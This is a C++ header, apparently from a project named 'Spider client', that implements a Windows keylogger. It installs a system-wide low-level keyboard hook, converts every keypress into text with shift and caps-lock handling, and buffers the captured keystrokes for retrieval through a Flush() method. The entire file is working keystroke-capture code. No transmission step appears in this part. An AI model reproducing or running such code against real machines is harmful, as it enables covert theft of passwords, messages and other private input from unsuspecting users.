//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP
#define SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP

#include <Windows.h>
#include <vector>
#include "IWindowsKeyListener.hpp"

HHOOK hhkLowLevelKybd;
IWindowsKeyListener *windowsKeyListener;

class WindowsKeyListener : public IWindowsKeyListener {
public:
	~WindowsKeyListener() {
		UnhookWindowsHookEx(hhkLowLevelKybd);
	}

	void Run() override final
	{
		hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
		MSG msg;
		GetMessage(&msg, nullptr, NULL, NULL); // Windows message loop keepalive. This will block the current thread.
	}
	
	std::string Flush() override final {
		std::string result;
		for (auto const& s : _capturedInputs) { result += s; }
		_capturedInputs.clear();
		return result;
	}

	void PushKeylog(std::string &keylog) override final {
		_capturedInputs.push_back(keylog);
	}

	WindowsKeyListener()
	{
		// Set global variable mendatory for hook to access appContext.
		windowsKeyListener = this;
	}

private:
	static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wp, LPARAM lp)
	{
		if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
			static auto capslock = false;
			static auto shift = false;
			char tmp[0xFF] = { 0 };
			std::string str;
			DWORD msg = 1;
			auto st_hook = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
			bool printable;

			msg += (st_hook.scanCode << 16);
			msg += (st_hook.flags << 24);
			GetKeyNameText(msg, tmp, 0xFF);
			str = std::string(tmp);

			printable = (str.length() <= 1) ? true : false;

			if (!printable) {

				if (str == "VERR.MAJ")
					capslock = !capslock;
				else if (str == "MAJ")
					shift = true;
				if (str == "ENTER") {
					str = "\n";
					printable = true;
				}
				else if (str == "SPACE") {
					str = " ";
					printable = true;
				}
				else if (str == "TAB") {
					str = "\t";
					printable = true;
				}
				else {
					str = ("[" + str + "]");
				}
			}

			if (printable) {
				if (shift == capslock) {
					for (size_t i = 0; i < str.length(); ++i)
						str[i] = tolower(str[i]);
				}
				else {
					for (size_t i = 0; i < str.length(); ++i) {
						if (str[i] >= 'A' && str[i] <= 'Z') {
							str[i] = toupper(str[i]);
						}
					}
				}

				shift = false;
			}
			windowsKeyListener->PushKeylog(str);
		}

		return CallNextHookEx(hhkLowLevelKybd, code, wp, lp);
	}

private:
	std::vector<std::string> _capturedInputs;
};

#endif //SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP